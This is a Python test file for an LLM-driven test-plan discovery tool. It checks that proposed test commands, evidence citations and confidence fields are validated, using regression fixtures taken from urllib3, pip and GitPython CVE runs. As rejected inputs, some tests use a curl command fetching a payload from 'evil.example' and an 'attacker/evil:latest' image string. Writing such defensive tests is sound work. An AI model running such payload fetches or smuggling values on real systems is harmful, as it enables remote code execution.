"""Tests for Test Plan Discovery: the one bounded LLM call that proposes a
TestExecutionPlan from repository evidence.

A fake LLM object (duck-typed, matching LLMClient.complete's signature) is
used throughout -- no real provider call is ever made."""

from __future__ import annotations

import json
import re
from pathlib import Path
from unittest import mock

from utilities.autopatcher.test_plan_discovery import _SYSTEM_PROMPT, _parse_response, discover_test_plan


def _valid_response(**overrides) -> str:
    payload = {
        "setup_commands": [["python", "-m", "pip", "install", "-e", "."]],
        "test_command": ["python", "-m", "pytest", "--junitxml=/tmp/openant-result.xml"],
        "result_strategy": "junit",
        "result_output_path": "/tmp/openant-result.xml",
        "runtime_family": "python",
        "runtime_version_hint": "3.11",
        "evidence": ["pyproject.toml"],
        "reasoning_summary": "pyproject.toml declares pytest.",
        "confidence": "high",
    }
    payload.update(overrides)
    return json.dumps(payload)


def _valid_response_missing(*missing_keys, **overrides) -> str:
    """Like _valid_response, but with the named top-level JSON key(s)
    entirely ABSENT from the payload -- distinct from setting a key to
    null/None, which keeps the key present. Used to reproduce the real
    urllib3 LLM response, which omitted "confidence" outright rather than
    supplying an explicit null for it."""
    payload = json.loads(_valid_response(**overrides))
    for key in missing_keys:
        payload.pop(key, None)
    return json.dumps(payload)


class _FakeLLM:
    def __init__(self, response):
        self.response = response
        self.calls = []

    def complete(self, system_prompt, user_message, stage="unknown"):
        self.calls.append((system_prompt, user_message, stage))
        if isinstance(self.response, Exception):
            raise self.response
        return self.response


class _SequentialFakeLLM:
    """Returns a DIFFERENT response for each successive call, in the
    given order -- used to test the bounded contract-repair retry, whose
    first and second responses genuinely differ. Raises if called more
    times than responses were supplied (a real bug -- e.g. a retry loop
    -- must be caught, never silently reuse the last response)."""

    def __init__(self, responses):
        self.responses = list(responses)
        self.calls = []

    def complete(self, system_prompt, user_message, stage="unknown"):
        self.calls.append((system_prompt, user_message, stage))
        response = self.responses[len(self.calls) - 1]
        if isinstance(response, Exception):
            raise response
        return response


def _repo_with_evidence(tmp_path: Path) -> Path:
    (tmp_path / "pyproject.toml").write_text("[tool.pytest.ini_options]\n", encoding="utf-8")
    return tmp_path


def _repo_with_rich_evidence(tmp_path: Path) -> Path:
    """A repo whose evidence spans every citable category: a config
    file, a lockfile, a CI workflow, and a README testing section."""
    (tmp_path / "pyproject.toml").write_text("[tool.pytest.ini_options]\n", encoding="utf-8")
    (tmp_path / "poetry.lock").write_text("[[package]]\n", encoding="utf-8")
    wf = tmp_path / ".github" / "workflows"
    wf.mkdir(parents=True)
    (wf / "ci.yml").write_text("jobs:\n  test:\n    steps: [pytest]\n", encoding="utf-8")
    (tmp_path / "README.md").write_text(
        "# Demo\n\n## Testing\n\nRun `pytest`.\n", encoding="utf-8",
    )
    return tmp_path


class TestDiscoverTestPlanHappyPath:
    def test_valid_response_produces_plan(self, tmp_path):
        llm = _FakeLLM(_valid_response())
        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
        assert plan is not None
        assert plan.test_command == ("python", "-m", "pytest", "--junitxml=/tmp/openant-result.xml")
        assert plan.runtime_family == "python"
        assert plan.source == "llm"

    def test_exactly_one_llm_call(self, tmp_path):
        llm = _FakeLLM(_valid_response())
        discover_test_plan(_repo_with_evidence(tmp_path), llm)
        assert len(llm.calls) == 1

    def test_markdown_fences_are_stripped(self, tmp_path):
        llm = _FakeLLM("```json\n" + _valid_response() + "\n```")
        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
        assert plan is not None

    def test_stage_is_recorded_for_cost_tracking(self, tmp_path):
        llm = _FakeLLM(_valid_response())
        discover_test_plan(_repo_with_evidence(tmp_path), llm)
        assert llm.calls[0][2] == "test_plan_discovery"


class TestNoEvidenceSkipsCall:
    def test_empty_repo_never_calls_llm(self, tmp_path):
        llm = _FakeLLM(_valid_response())
        plan = discover_test_plan(tmp_path, llm)
        assert plan is None
        assert len(llm.calls) == 0


class TestMalformedOrUnsafeResponsesRejected:
    def test_malformed_json_returns_none(self, tmp_path):
        llm = _FakeLLM("not json at all {{{")
        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
        assert plan is None

    def test_missing_required_key_returns_none(self, tmp_path):
        payload = json.loads(_valid_response())
        del payload["evidence"]
        llm = _FakeLLM(json.dumps(payload))
        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
        assert plan is None

    def test_invalid_result_strategy_enum_returns_none(self, tmp_path):
        llm = _FakeLLM(_valid_response(result_strategy="xunit"))
        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
        assert plan is None

    def test_unrecognized_confidence_string_is_rejected(self, tmp_path):
        """confidence is part of the required response CONTRACT (see
        TestConfidenceMatrix below and the module docstring) -- an
        unrecognized self-report is REJECTED outright, exactly like an
        unrecognized result_strategy. A real urllib3 replay showed the
        opposite (silent "unknown" substitution, plan still accepted)
        being unsafe; this supersedes that old tolerant behavior."""
        llm = _FakeLLM(_valid_response(confidence="extremely-sure"))
        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
        assert plan is None

    def test_low_confidence_returns_none(self, tmp_path):
        llm = _FakeLLM(_valid_response(confidence="low"))
        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
        assert plan is None

    def test_non_dict_json_returns_none(self, tmp_path):
        llm = _FakeLLM(json.dumps(["not", "a", "dict"]))
        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
        assert plan is None

    def test_setup_commands_not_list_of_lists_returns_none(self, tmp_path):
        llm = _FakeLLM(_valid_response(setup_commands=["python -m pip install -e ."]))
        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
        assert plan is None

    def test_plan_failing_deterministic_validation_returns_none(self, tmp_path):
        """A structurally-parseable response whose CONTENT fails
        test_plan_validation.validate_plan (e.g. an unrecognized binary or
        a shell metacharacter) must still surface as None -- discovery is
        not just JSON parsing, it's validated end to end."""
        llm = _FakeLLM(_valid_response(test_command=["curl", "http://evil.example/payload.sh"]))
        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
        assert plan is None

    def test_runtime_family_cannot_smuggle_an_image_string(self, tmp_path):
        llm = _FakeLLM(_valid_response(runtime_family="attacker/evil:latest"))
        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
        assert plan is None

    def test_llm_exception_returns_none(self, tmp_path):
        llm = _FakeLLM(RuntimeError("provider unavailable"))
        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
        assert plan is None


class TestEvidenceProvenanceEnforcement:
    """plan.evidence must be an exact subset of what was actually shown to
    the model -- never fuzzy-matched, never trusted merely because it is
    non-empty."""

    def test_all_evidence_valid_is_accepted(self, tmp_path):
        repo = _repo_with_rich_evidence(tmp_path)
        llm = _FakeLLM(_valid_response(
            evidence=["pyproject.toml", "poetry.lock", ".github/workflows/ci.yml", "README.md"],
        ))
        plan = discover_test_plan(repo, llm)
        assert plan is not None

    def test_one_hallucinated_evidence_path_is_rejected(self, tmp_path):
        repo = _repo_with_evidence(tmp_path)  # only pyproject.toml actually exists
        llm = _FakeLLM(_valid_response(evidence=["tox.ini"]))
        plan = discover_test_plan(repo, llm)
        assert plan is None

    def test_mixed_valid_and_hallucinated_evidence_is_rejected(self, tmp_path):
        repo = _repo_with_evidence(tmp_path)
        llm = _FakeLLM(_valid_response(evidence=["pyproject.toml", "tox.ini"]))
        plan = discover_test_plan(repo, llm)
        assert plan is None

    def test_ci_workflow_path_is_a_valid_citation(self, tmp_path):
        repo = _repo_with_rich_evidence(tmp_path)
        llm = _FakeLLM(_valid_response(evidence=[".github/workflows/ci.yml"]))
        plan = discover_test_plan(repo, llm)
        assert plan is not None

    def test_lockfile_name_is_a_valid_citation(self, tmp_path):
        repo = _repo_with_rich_evidence(tmp_path)
        llm = _FakeLLM(_valid_response(evidence=["poetry.lock"]))
        plan = discover_test_plan(repo, llm)
        assert plan is not None

    def test_readme_citation_matches_the_exact_source_filename(self, tmp_path):
        """The bundle tracks WHICH README filename was actually read
        (README.md here) -- citing that exact name is valid; citing a
        generic "README" when the real file is README.md is not (no
        fuzzy matching)."""
        repo = _repo_with_rich_evidence(tmp_path)
        llm_ok = _FakeLLM(_valid_response(evidence=["README.md"]))
        assert discover_test_plan(repo, llm_ok) is not None

        llm_bad = _FakeLLM(_valid_response(evidence=["README"]))
        assert discover_test_plan(repo, llm_bad) is None

    def test_directory_listing_entry_is_a_valid_citation(self, tmp_path):
        repo = _repo_with_evidence(tmp_path)
        (repo / "tests").mkdir()
        llm = _FakeLLM(_valid_response(evidence=["pyproject.toml", "tests/"]))
        plan = discover_test_plan(repo, llm)
        assert plan is not None

    def test_empty_evidence_list_is_rejected_by_validation(self, tmp_path):
        """Not a provenance issue per se (an empty list is trivially a
        subset of anything) -- but validate_plan's own non-empty-evidence
        rule still applies downstream."""
        repo = _repo_with_evidence(tmp_path)
        llm = _FakeLLM(_valid_response(evidence=[]))
        plan = discover_test_plan(repo, llm)
        assert plan is None


class TestOutputFieldBounds:
    def test_overlong_reasoning_summary_is_truncated_not_rejected(self, tmp_path):
        from utilities.autopatcher.test_plan_discovery import _MAX_REASONING_SUMMARY_CHARS
        repo = _repo_with_evidence(tmp_path)
        llm = _FakeLLM(_valid_response(reasoning_summary="x" * 5000))
        plan = discover_test_plan(repo, llm)
        assert plan is not None
        assert len(plan.reasoning_summary) <= _MAX_REASONING_SUMMARY_CHARS

    def test_too_many_evidence_entries_is_rejected(self, tmp_path):
        repo = _repo_with_evidence(tmp_path)
        llm = _FakeLLM(_valid_response(evidence=["pyproject.toml"] * 1 + [f"f{i}.txt" for i in range(30)]))
        plan = discover_test_plan(repo, llm)
        assert plan is None

    def test_overlong_evidence_entry_is_rejected(self, tmp_path):
        repo = _repo_with_evidence(tmp_path)
        llm = _FakeLLM(_valid_response(evidence=["pyproject.toml", "x" * 1000]))
        plan = discover_test_plan(repo, llm)
        assert plan is None


class TestPromptContract:
    def test_system_prompt_forbids_docker_image_proposals(self):
        assert "Never propose a Docker image" in _SYSTEM_PROMPT

    def test_system_prompt_requires_evidence_citation(self):
        assert "evidence" in _SYSTEM_PROMPT.lower()

    def test_system_prompt_forbids_chain_of_thought(self):
        assert "reasoning_summary" in _SYSTEM_PROMPT
        assert "chain of reasoning" in _SYSTEM_PROMPT or "not a chain" in _SYSTEM_PROMPT

    def test_system_prompt_distinguishes_runtime_family_from_test_tool(self):
        assert "make" in _SYSTEM_PROMPT.lower()

    def test_system_prompt_prefers_structured_output_when_safe(self):
        """The prompt must state the PREFERENCE for structured, per-test
        result output over a bare exit code -- this is the direct fix for
        the observed real-run limitation (a confident pytest repository
        that still got result_strategy="exit_code")."""
        assert "Prefer structured, per-test result output" in _SYSTEM_PROMPT
        assert "bare exit code" in _SYSTEM_PROMPT

    def test_system_prompt_requires_confidence_in_a_specific_known_runner(self):
        assert "SPECIFIC, well-known" in _SYSTEM_PROMPT
        assert "not a guess" in _SYSTEM_PROMPT

    def test_system_prompt_requires_command_to_reference_declared_path(self):
        assert "test_command's own tokens actually" in _SYSTEM_PROMPT
        assert re.search(r"will be\s+rejected", _SYSTEM_PROMPT)

    def test_system_prompt_forbids_speculative_or_third_party_flags(self):
        assert "speculative or unfamiliar runner flag" in _SYSTEM_PROMPT
        assert "third-party reporter/plugin flag" in _SYSTEM_PROMPT

    def test_system_prompt_forbids_changing_test_selection_for_structured_output(self):
        assert "any change to which tests are selected" in _SYSTEM_PROMPT

    def test_system_prompt_forbids_parallelization_retry_and_failfast_changes(self):
        assert "parallelization/xdist changes, retries, or fail-fast flags" in _SYSTEM_PROMPT

    def test_system_prompt_directs_custom_runners_to_exit_code(self):
        assert "make test" in _SYSTEM_PROMPT
        assert "./scripts/test.sh" in _SYSTEM_PROMPT

    def test_system_prompt_never_suggests_hardcoded_flag_syntax_outside_the_pytest_example(self):
        """The only concrete flag literal in the prompt is the single
        worked pytest example -- the rule itself is expressed generically
        ("that EXACT runner's own standard, built-in flag"), not as a
        hardcoded table of runner -> flag mappings. This guards against
        the prompt accidentally growing into a runner-capability database
        in a future edit."""
        assert _SYSTEM_PROMPT.count("--junitxml") <= 3


class TestSameTestSelectionInvariant:
    """Structured-output preference must never change which tests run --
    only how results are reported."""

    def test_junit_plan_selection_matches_plan_with_flag_stripped(self, tmp_path):
        base_selection = ("python", "-m", "pytest", "-k", "not slow", "test/")
        llm = _FakeLLM(_valid_response(
            test_command=list(base_selection) + ["--junitxml=/tmp/openant-result.xml"],
        ))
        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
        assert plan is not None
        selection_only = tuple(
            token for token in plan.test_command
            if plan.result_output_path not in token
        )
        assert selection_only == base_selection

    def test_exit_code_plan_selection_is_untouched(self, tmp_path):
        """An exit_code plan has no flag/path to strip -- its command IS
        the selection, unchanged."""
        base_selection = ("python", "-m", "pytest", "-k", "not slow", "test/")
        llm = _FakeLLM(_valid_response(
            test_command=list(base_selection),
            result_strategy="exit_code", result_output_path=None,
        ))
        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
        assert plan is not None
        assert plan.test_command == base_selection


def _urllib3_shaped_repo(tmp_path: Path) -> Path:
    """Mirrors the actual repository-evidence shape from the real urllib3
    CVE-2023-43804 validation run that originally exposed this
    limitation: a pyproject.toml with pytest config, a noxfile.py
    invoking pytest, a dev-requirements.txt declaring pytest, and CI
    running that same invocation -- evidence that should make pytest
    identification both specific and confident."""
    (tmp_path / "pyproject.toml").write_text(
        "[tool.pytest.ini_options]\naddopts = '-ra --tb=native'\n", encoding="utf-8",
    )
    (tmp_path / "noxfile.py").write_text(
        "import nox\n\n@nox.session\ndef test(session):\n"
        "    session.run('pytest', '-v', '-ra', '--tb=native', '--strict-config', "
        "'--strict-markers', 'test/')\n",
        encoding="utf-8",
    )
    (tmp_path / "dev-requirements.txt").write_text("pytest\n", encoding="utf-8")
    wf = tmp_path / ".github" / "workflows"
    wf.mkdir(parents=True)
    (wf / "test.yml").write_text(
        "jobs:\n  test:\n    steps:\n      - run: python -m pytest -v -ra --tb=native "
        "--strict-config --strict-markers test/\n",
        encoding="utf-8",
    )
    return tmp_path


class TestUrllib3ShapedRealRunRegression:
    """Modeled directly on the actual evidence bundle from the real
    urllib3 CVE-2023-43804 validation run, where Test Plan Discovery
    returned result_strategy="exit_code" despite this exact evidence
    shape clearly identifying pytest -- weakening the comparator to
    NOT_VERIFIED unnecessarily. This is a deterministic fixture (no live
    LLM call): it asserts that a plan matching the NEW preferred shape --
    junit, same test selection, only the reporting flag appended --
    validates end to end, and that the before/after commands differ by
    EXACTLY the structured-output flag."""

    _BEFORE = ("python", "-m", "pytest", "-v", "-ra", "--tb=native",
               "--strict-config", "--strict-markers", "test/")
    _AFTER = _BEFORE + ("--junitxml=/tmp/openant-result.xml",)

    def _llm(self, **overrides):
        base = dict(
            test_command=list(self._AFTER),
            result_strategy="junit",
            result_output_path="/tmp/openant-result.xml",
            evidence=["pyproject.toml", "noxfile.py", "dev-requirements.txt",
                      ".github/workflows/test.yml"],
            reasoning_summary=(
                "Repository evidence identifies pytest; JUnit XML output is "
                "enabled only to capture per-test results and does not change "
                "test selection."
            ),
        )
        base.update(overrides)
        return _FakeLLM(_valid_response(**base))

    def test_junit_plan_with_appended_flag_only_is_accepted(self, tmp_path):
        repo = _urllib3_shaped_repo(tmp_path)
        plan = discover_test_plan(repo, self._llm())
        assert plan is not None
        assert plan.result_strategy == "junit"
        assert plan.result_output_path == "/tmp/openant-result.xml"
        assert plan.test_command == self._AFTER

    def test_appended_flag_is_the_only_difference_from_the_evidenced_invocation(self, tmp_path):
        repo = _urllib3_shaped_repo(tmp_path)
        plan = discover_test_plan(repo, self._llm())
        assert plan is not None
        selection_only = tuple(
            token for token in plan.test_command
            if plan.result_output_path not in token
        )
        assert selection_only == self._BEFORE

    def test_reverting_to_exit_code_on_the_same_evidence_is_also_still_accepted(self, tmp_path):
        """The fix is a preference, not a mandate -- exit_code on this
        same evidence must remain a valid, accepted plan too (e.g. if the
        model is not fully confident)."""
        repo = _urllib3_shaped_repo(tmp_path)
        plan = discover_test_plan(repo, self._llm(
            test_command=list(self._BEFORE),
            result_strategy="exit_code", result_output_path=None,
            reasoning_summary="Not fully confident in a structured-output flag; using exit_code.",
        ))
        assert plan is not None
        assert plan.result_strategy == "exit_code"


class TestCustomRunnerPrefersExitCode:
    """A bespoke command with no confidently-known structured-output flag
    must remain a valid exit_code plan -- discovery must never invent a
    result converter or wrap/replace the repository's own command."""

    def test_make_test_with_exit_code_is_accepted(self, tmp_path):
        (tmp_path / "Makefile").write_text("test:\n\tpytest\n", encoding="utf-8")
        llm = _FakeLLM(_valid_response(
            setup_commands=[],
            test_command=["make", "test"],
            result_strategy="exit_code", result_output_path=None,
            evidence=["Makefile"],
            reasoning_summary="Makefile defines a bespoke test target; no confidently-known structured-output flag.",
        ))
        plan = discover_test_plan(tmp_path, llm)
        assert plan is not None
        assert plan.result_strategy == "exit_code"
        assert plan.result_output_path is None
        assert plan.test_command == ("make", "test")

    def test_shell_script_runner_with_exit_code_is_accepted(self, tmp_path):
        (tmp_path / "Makefile").write_text("test:\n\t./scripts/test.sh\n", encoding="utf-8")
        llm = _FakeLLM(_valid_response(
            setup_commands=[],
            test_command=["make", "test"],
            result_strategy="exit_code", result_output_path=None,
            evidence=["Makefile"],
        ))
        plan = discover_test_plan(tmp_path, llm)
        assert plan is not None
        assert plan.result_strategy == "exit_code"


class TestLowConfidenceNeverInventsJunit:
    def test_low_confidence_junit_claim_is_still_rejected(self, tmp_path):
        """Even if the model claims "junit" with a plausible-looking
        flag, a self-reported "low" confidence must still discard the
        whole plan -- confidence-gating happens before the plan is ever
        trusted, regardless of result_strategy."""
        llm = _FakeLLM(_valid_response(
            result_strategy="junit", result_output_path="/tmp/openant-result.xml",
            test_command=["python", "-m", "pytest", "--junitxml=/tmp/openant-result.xml"],
            confidence="low",
        ))
        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
        assert plan is None

    def test_junit_claim_whose_command_never_references_the_path_is_rejected(self, tmp_path):
        """Guards against the model claiming "junit" without actually
        requesting it from the command -- validate_plan's consistency
        check must still reject this via the normal discovery path (not
        just when validate_plan is called directly)."""
        llm = _FakeLLM(_valid_response(
            result_strategy="junit", result_output_path="/tmp/openant-result.xml",
            test_command=["python", "-m", "pytest"],
        ))
        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
        assert plan is None


class TestConfidenceMatrix:
    """confidence is advisory in what it's USED for (never part of the
    execution-safety boundary -- see "Confidence semantics" in the module
    docstring), but IS part of the required response CONTRACT (see
    "Metadata vs. execution-critical fields"). This is the full behavior
    matrix: "high"/"medium" are preserved, a model's OWN deliberate "low"
    self-report blocks discovery (a cost heuristic, not a validation
    failure), and missing/wrong-typed/unrecognized confidence is REJECTED
    outright -- never silently substituted with an out-of-schema
    placeholder and accepted."""

    def test_high_is_preserved(self, tmp_path):
        llm = _FakeLLM(_valid_response(confidence="high"))
        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
        assert plan is not None
        assert plan.confidence == "high"

    def test_medium_is_preserved(self, tmp_path):
        llm = _FakeLLM(_valid_response(confidence="medium"))
        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
        assert plan is not None
        assert plan.confidence == "medium"

    def test_low_is_the_one_case_that_still_blocks_discovery(self, tmp_path):
        """Documented, deliberate exception: a model that reports "low"
        about its OWN plan is trusted on that one point -- OpenAnt
        doesn't spend a Docker build on a plan the model has already
        said it doesn't trust. This is a cost/reliability heuristic, not
        a security boundary (deterministic validation still runs first
        for every other confidence value) -- see the module docstring."""
        llm = _FakeLLM(_valid_response(confidence="low"))
        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
        assert plan is None

    def test_missing_confidence_is_rejected(self, tmp_path):
        """The exact real urllib3 replay bug: the LLM's response omitted
        "confidence" entirely. An earlier version of this module
        normalized that to "unknown" and still returned the plan -- now
        it is rejected outright, the same as any other missing
        execution-critical-shaped field."""
        llm = _FakeLLM(_valid_response_missing("confidence"))
        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
        assert plan is None

    def test_invalid_type_is_rejected(self, tmp_path):
        llm = _FakeLLM(_valid_response(confidence=42))
        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
        assert plan is None

    def test_unrecognized_string_is_rejected(self, tmp_path):
        llm = _FakeLLM(_valid_response(confidence="extremely-sure"))
        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
        assert plan is None


def _urllib3_real_response_missing_confidence() -> str:
    """The EXACT shape of the real urllib3 CVE-2023-43804 Test Plan
    Discovery LLM response that triggered this fix -- a fully valid,
    execution-critical-complete plan (junit strategy, /tmp output path
    referenced by the command, valid evidence) with "confidence" omitted
    outright."""
    payload = {
        "setup_commands": [
            ["python", "-m", "pip", "install", "-r", "dev-requirements.txt"],
            ["python", "-m", "pip", "install", "."],
        ],
        "test_command": [
            "python", "-m", "pytest",
            "test/",
            "--strict-config",
            "--strict-markers",
            "--junitxml=/tmp/openant-result.xml",
        ],
        "result_strategy": "junit",
        "result_output_path": "/tmp/openant-result.xml",
        "runtime_family": "python",
        "runtime_version_hint": "3.7-3.12",
        "evidence": [
            "pyproject.toml",
            "noxfile.py",
            "dev-requirements.txt",
            ".github/workflows/ci.yml",
        ],
        "reasoning_summary": (
            "Repository evidence identifies pytest; JUnit XML is added only to "
            "capture per-test results without changing test selection."
        ),
        # "confidence" deliberately absent -- this is the real bug.
    }
    return json.dumps(payload)


def _urllib3_real_response_repo(tmp_path: Path) -> Path:
    (tmp_path / "pyproject.toml").write_text("[tool.pytest.ini_options]\n", encoding="utf-8")
    (tmp_path / "noxfile.py").write_text(
        "import nox\n\n@nox.session\ndef test(session):\n    session.run('pytest', 'test/')\n",
        encoding="utf-8",
    )
    (tmp_path / "dev-requirements.txt").write_text("pytest\n", encoding="utf-8")
    wf = tmp_path / ".github" / "workflows"
    wf.mkdir(parents=True)
    (wf / "ci.yml").write_text("jobs:\n  test:\n    steps:\n      - run: pytest test/\n", encoding="utf-8")
    return tmp_path


class TestUrllib3ConfidenceOmittedRealRunRegression:
    """Reproduces the exact real urllib3 CVE-2023-43804 replay failure:
    a strong, fully execution-critical-valid plan was SILENTLY ACCEPTED
    with a fabricated "unknown" confidence value, solely because the
    response omitted "confidence" -- an out-of-schema value the LLM never
    actually returned, persisted as if it were legitimate. No live LLM
    call -- a deterministic fixture built from the exact JSON shape
    observed in the real run.

    Expected result after this fix: the response is REJECTED outright
    (discover_test_plan returns None) -- exactly the same "no plan
    discovered" outcome any other execution-critical-shaped contract
    violation already produces. This class supersedes an earlier version
    of itself that asserted the opposite (silent acceptance) as correct."""

    def test_plan_is_rejected_despite_otherwise_being_execution_critical_valid(self, tmp_path):
        repo = _urllib3_real_response_repo(tmp_path)
        llm = _FakeLLM(_urllib3_real_response_missing_confidence())
        plan = discover_test_plan(repo, llm)
        assert plan is None

    def test_rejection_reason_names_confidence(self, tmp_path):
        repo = _urllib3_real_response_repo(tmp_path)
        llm = _FakeLLM(_urllib3_real_response_missing_confidence())
        rejection_reason: "list[str]" = []
        plan = discover_test_plan(repo, llm, rejection_reason=rejection_reason)
        assert plan is None
        assert rejection_reason and "confidence" in rejection_reason[0]

    def test_supplying_a_valid_confidence_on_the_same_shape_is_accepted(self, tmp_path):
        """Confirms the fixture itself is otherwise well-formed -- adding
        back a valid confidence value (what the model SHOULD have
        returned) makes it discoverable, isolating confidence as the
        sole cause of the rejection above."""
        from utilities.autopatcher.test_plan_validation import validate_plan
        repo = _urllib3_real_response_repo(tmp_path)
        payload = json.loads(_urllib3_real_response_missing_confidence())
        payload["confidence"] = "high"
        llm = _FakeLLM(json.dumps(payload))
        plan = discover_test_plan(repo, llm)
        assert plan is not None
        assert plan.confidence == "high"
        assert plan.result_strategy == "junit"
        assert plan.result_output_path == "/tmp/openant-result.xml"
        assert plan.test_command == (
            "python", "-m", "pytest", "test/", "--strict-config",
            "--strict-markers", "--junitxml=/tmp/openant-result.xml",
        )
        result = validate_plan(plan)
        assert result.valid is True
        assert result.reason is None

    def test_execution_critical_fields_are_all_still_enforced_on_this_exact_shape(self, tmp_path):
        """Sanity check that this fixture isn't accidentally exercising a
        weakened path -- breaking any EXECUTION-CRITICAL field on this
        exact real shape must still reject, independent of confidence."""
        repo = _urllib3_real_response_repo(tmp_path)
        broken = json.loads(_urllib3_real_response_missing_confidence())
        broken["confidence"] = "high"
        broken["test_command"] = ["curl", "http://evil.example/payload.sh"]
        llm = _FakeLLM(json.dumps(broken))
        plan = discover_test_plan(repo, llm)
        assert plan is None


# --- Real pip (CVE-2019-20916) and GitPython (CVE-2026-44243) regression
# suite runs found a second, independent bug: both repositories'
# repository-owned test entry point is a BARE `pytest ...` invocation
# (pip's tox.ini `[testenv] commands = pytest --timeout 300 []`;
# GitPython's tox.ini/CI directly running `pytest --color=yes ...`) --
# exactly what _SYSTEM_PROMPT's "PRESERVE REPOSITORY-OWNED ENTRY POINTS" /
# "When a direct command is appropriate" rules tell the model to preserve
# as-is rather than reconstruct as "python -m pytest". The model did so
# correctly in both real runs; test_plan_validation.ALLOWED_COMMAND_BINARIES
# nonetheless rejected it as an unrecognized binary -- entirely downstream
# of _parse_response/retry, never a retry-eligibility issue. Fixed by
# adding "pytest" to that allow-list; see test_test_plan_validation.py's
# own regression coverage for the validator-level proof.

def _pip_real_response() -> str:
    """The EXACT real pip CVE-2019-20916 regression-suite response (see
    006_test_plan_discovery.response.txt) that was wrongly rejected before
    this fix -- fully execution-critical-valid, confidence "medium", and
    every evidence citation genuinely shown to the model."""
    payload = {
        "setup_commands": [["pip", "install", "-r", "tools/tests-requirements.txt"]],
        "test_command": ["pytest", "--timeout", "300", "--junitxml=/tmp/openant-result.xml"],
        "result_strategy": "junit",
        "result_output_path": "/tmp/openant-result.xml",
        "runtime_family": "python",
        "runtime_version_hint": ">=2.7,!=3.0.*,!=3.1.*,!=3.2.*,!=3.3.*",
        "evidence": ["tox.ini", "setup.cfg", "setup.py"],
        "reasoning_summary": (
            "tox.ini's [testenv] runs `pytest --timeout 300` with deps from "
            "tools/tests-requirements.txt, and setup.cfg's [tool:pytest] configures "
            "pytest; JUnit XML is appended only to capture per-test results without "
            "changing selection. The tox commands_pre wheel-building step is not "
            "reconstructed here as it is not part of pytest's own interface."
        ),
        "confidence": "medium",
    }
    return json.dumps(payload)


def _pip_real_response_repo(tmp_path: Path) -> Path:
    (tmp_path / "tox.ini").write_text(
        "[testenv]\ndeps = -r{toxinidir}/tools/tests-requirements.txt\n"
        "commands = pytest --timeout 300 []\n",
        encoding="utf-8",
    )
    (tmp_path / "setup.cfg").write_text("[tool:pytest]\naddopts = -r aR\n", encoding="utf-8")
    (tmp_path / "setup.py").write_text("from setuptools import setup\nsetup()\n", encoding="utf-8")
    return tmp_path


class TestPipBarePytestRealRunRegression:
    """Reproduces the exact real pip CVE-2019-20916 regression-suite
    failure: a fully valid, well-evidenced, confidence="medium" plan was
    rejected outright because test_command begins with bare "pytest"."""

    def test_real_pip_response_is_accepted(self, tmp_path):
        repo = _pip_real_response_repo(tmp_path)
        llm = _FakeLLM(_pip_real_response())
        plan = discover_test_plan(repo, llm)
        assert plan is not None
        assert plan.test_command == ("pytest", "--timeout", "300", "--junitxml=/tmp/openant-result.xml")
        assert plan.confidence == "medium"
        assert plan.result_strategy == "junit"

    def test_real_pip_response_makes_exactly_one_call_no_retry_needed(self, tmp_path):
        """The pip response was never missing/invalid in a repairable
        way -- it fails (before this fix) at deterministic validation,
        entirely downstream of _parse_response/retry. Confirms the fix
        does not, and should not, involve the retry mechanism at all."""
        repo = _pip_real_response_repo(tmp_path)
        llm = _FakeLLM(_pip_real_response())
        discover_test_plan(repo, llm)
        assert len(llm.calls) == 1


def _gitpython_real_initial_response_missing_confidence() -> str:
    """The EXACT real GitPython CVE-2026-44243 regression-suite initial
    response (see 007_test_plan_discovery.response.txt) -- otherwise
    execution-critical-valid, "confidence" omitted outright."""
    payload = {
        "setup_commands": [["pip", "install", ".[test]"], ["./init-tests-after-clone.sh"]],
        "test_command": ["pytest", "--color=yes", "--junitxml=/tmp/openant-result.xml"],
        "result_strategy": "junit",
        "result_output_path": "/tmp/openant-result.xml",
        "runtime_family": "python",
        "runtime_version_hint": ">=3.7",
        "evidence": [
            "pyproject.toml", "tox.ini", "test-requirements.txt", "setup.py",
            ".github/workflows/alpine-test.yml",
        ],
        "reasoning_summary": (
            "pyproject.toml [tool.pytest.ini_options] and tox.ini (`pytest --color=yes`) "
            "plus CI (`pytest --color=yes ...`) establish pytest as the runner; setup.py "
            "declares a 'test' extra installed via `pip install .[test]` and CI runs "
            "./init-tests-after-clone.sh to prepare the repo. JUnit XML is appended only "
            "to capture per-test results without changing selection."
        ),
        # "confidence" deliberately absent -- this is the real, observed model failure.
    }
    return json.dumps(payload)


def _gitpython_real_retry_response_missing_confidence() -> str:
    """The EXACT real GitPython contract-repair retry response (see
    008_test_plan_discovery_contract_retry.response.txt): the model
    dropped the unrecognized-later ./init-tests-after-clone.sh setup
    command, but STILL omitted "confidence" -- a genuine, repeated model
    failure. Per the bounded-retry design, a second failure of any kind
    is never retried again -- this is the real, correct-as-observed
    rejection, not a bug this fix addresses (see the class below)."""
    payload = {
        "setup_commands": [["python", "-m", "pip", "install", ".[test]"]],
        "test_command": ["pytest", "--color=yes", "--junitxml=/tmp/openant-result.xml"],
        "result_strategy": "junit",
        "result_output_path": "/tmp/openant-result.xml",
        "runtime_family": "python",
        "runtime_version_hint": ">=3.7",
        "evidence": [
            "pyproject.toml", "tox.ini", "setup.py", "test-requirements.txt",
            ".github/workflows/alpine-test.yml",
        ],
        "reasoning_summary": (
            "pyproject.toml's [tool.pytest.ini_options] and tox.ini ([testenv] runs "
